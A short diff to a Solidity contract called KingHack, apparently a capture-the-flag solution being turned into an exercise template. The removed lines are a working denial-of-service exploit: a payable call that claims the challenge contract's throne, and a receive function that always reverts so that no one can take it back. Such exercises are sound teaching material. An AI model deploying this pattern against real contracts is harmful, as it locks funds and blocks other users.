@@ -14,11 +14,6 @@ contract KingHack {
     }
 
     function attack() external payable {
-        (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
-        require(success, "External call failed");
-    }
-
-    receive() external payable {
-        require(false, "I am King forever!");
+        /// code here
     }
 }
